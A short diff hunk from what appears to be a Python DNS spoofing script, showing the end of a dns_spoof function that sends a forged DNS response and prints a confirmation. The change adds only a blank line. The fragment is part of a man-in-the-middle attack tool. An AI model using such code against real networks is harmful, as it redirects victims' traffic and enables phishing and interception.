@@ -14,6 +14,7 @@ def dns_spoof(pkt, target_ip):
         spoofed_pkt.chksum = None  
         spoofed_pkt = spoofed_pkt.__class__(bytes(spoofed_pkt))
         send(spoofed_pkt, verbose=0)  
+        
         #spoofed_pkt.show()
         print("DNS packet intercepted and false response sent")
 
